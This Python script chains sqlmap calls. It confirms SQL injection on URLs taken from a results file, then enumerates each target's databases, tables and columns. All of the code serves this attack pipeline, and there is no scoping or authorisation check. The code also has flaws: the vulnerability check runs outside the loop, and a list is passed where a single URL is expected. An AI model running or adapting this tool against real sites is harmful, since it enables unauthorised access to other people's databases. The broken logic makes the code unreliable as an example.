import subprocess
import os
import time

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list
        data = f.readlines()
    # Returns the data
    return data

# Function to filter out any results which flag a false positive
def filter_results(data):
    # Stores the verified urls
    verified_urls = []
    
    # Loops over the urls in the data
    for url in data:
        # Outputs the url being verifyed
        print(f"Verifying: {url}")
        
        # Runs sqlmap with --batch to skip prompts
        result = subprocess.run([
            "sqlmap", "-u", url, 
            "--batch", 
            "--level=1", # Fixed typo from leval
            "--flush-session" # Ignore previous results for a clean test
        ], capture_output=True, text=True)

    # Checks the standard output for is vulnerable
    if "is vulnerable" in result.stdout:
        # Outputs the url is confirmed as vulnerable
        print(f"[+] Confirmed: {url}")
        # Adds the url to the verified urls
        verified_urls.append(url)
    else:
        # Ouputs the url was a false positive
        print(f"[-] False Positive: {url}")
    # Returns verified urls
    return verified_urls

# Function to extract the databases
def extract_databases(url):
    # Stores the databases
    databases = []

    # Runs sqlmap as a subprocess to get databases
    database_scan = subprocess.run(["sqlmap", "-u", url, "--dbs", "--batch"], capture_output=True, text=True)

    # Loops over the split lines of the output
    for line in database_scan.stdout.splitlines():
        # Checks for lines with a database marker
        if "[*]" in line:
            # Extracts the database name from the end of the line
            database = line.split()[-1]
            # Adds to the databases list
            databases.append(database)

    # Creates unique database list using a set
    unique_databases = list(set(databases))

    # Returns the unique databases
    return unique_databases

# Function to extract the tables
def extract_tables(url, databases):
    # Stores the database tables mapping
    database_tables = {}

    # Loops over the databases provided
    for database in databases:
        # Initialize the list for the specific database to avoid overwriting
        database_tables[database] = []
        
        # Runs sqlmap to get tables for the specific database
        result = subprocess.run(["sqlmap", "-u", url, "-D", database, "--tables", "--batch"], capture_output=True, text=True)

        # Loops over the output lines
        for line in result.stdout.splitlines():
            # Checks for table grid borders and ignores header keywords
            if "|" in line and "Table" not in line and "---" not in line:
                # Splits the line into parts
                parts = line.split("|")
                # Checks if the parts contain a table name
                if len(parts) > 1:
                    # Extracts and cleans the table name
                    table_name = parts[1].strip()
                    # Adds the table name to the correct database key
                    database_tables[database].append(table_name)
    # Returns the dictionary of databases and tables
    return database_tables

# Function to extract the columns
def extract_columns(url, db_tables_map):
    # Stores the columns data in a nested dictionary
    column_data = {}

    # Loops over each database in the map
    for database, tables in db_tables_map.items():
        # Initializes the database entry
        column_data[database] = {}
        
        # Loops over the tables within that database
        for table in tables:
            # Initializes the list for the specific table
            column_data[database][table] = []
            
            # Runs sqlmap to get columns for the specific table
            result = subprocess.run(["sqlmap", "-u", url, "-D", database, "-T", table, "--columns", "--batch"], capture_output=True, text=True)

            # Loops over the output lines
            for line in result.stdout.splitlines():
                # Checks for the column grid and ignores headers
                if "|" in line and not any(x in line for x in ["Column", "+---", "Type"]):
                    # Splits the line to find the column name
                    parts = [p.strip() for p in line.split("|") if p.strip()]
                    # Checks if a column name was found
                    if parts:
                        # Adds the column name to the table list
                        column_data[database][table].append(parts[0])

    # Returns the complete column data
    return column_data

# Main executable function
def main():
    # Logs the starting time
    start_time = time.perf_counter() 

    # Asks for the path of the results file
    results_path = input("[+] Please enter the results file path: ").strip()

    # Checks if the input is a file path
    if os.path.isfile(results_path):

        print("[+] Importing data")

        # Function to bring in the results data
        data = import_results_data(results_path)

        print("[+] Filtering data")

        # Stores the filtered data
        filtered_data = filter_results(data)

        print("[+] Extracting database names")

        # Stores the databases
        databases = extract_databases(filtered_data)

        print("[+] Extracting tables")

        # Stores the tables
        tables = extract_tables(filtered_data, databases)

        print("[+] Extracting Columns")

        # Stores the columsn
        columns = extract_columns(filtered_data,tables)

        # Outputs the columns
        for i in columns:
            print(i)
    else:
        print("[!] Invaild file path")

    # Gets end time and calculates the elasped time
    end_time = time.perf_counter()
    elapsed = end_time - start_time

    # Outputs the time
    print(f"\n[âœ“] Finished in {elapsed:.2f} seconds")

if __name__ == "__main__":
    main()